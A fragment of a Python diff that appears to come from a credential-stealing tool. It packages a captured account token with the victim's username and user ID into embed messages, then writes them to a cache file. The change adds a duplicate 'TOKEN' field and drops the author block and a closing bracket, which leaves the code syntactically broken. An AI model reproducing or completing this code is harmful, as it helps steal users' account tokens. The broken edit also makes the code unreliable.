@@ -167,10 +167,11 @@ def main():
                         "value":f"`{token}`",
                         "inline": False
                     }
-                ],
-                "author": {
-                    "name": f"{username} : {user_id}",
-                }
+                    {
+                        "name": "TOKEN",
+                        "value":f"`{token}`",
+                        "inline": False
+                    }
             }
             embeds.append(embed)
     with open(cache_path, "a") as file:
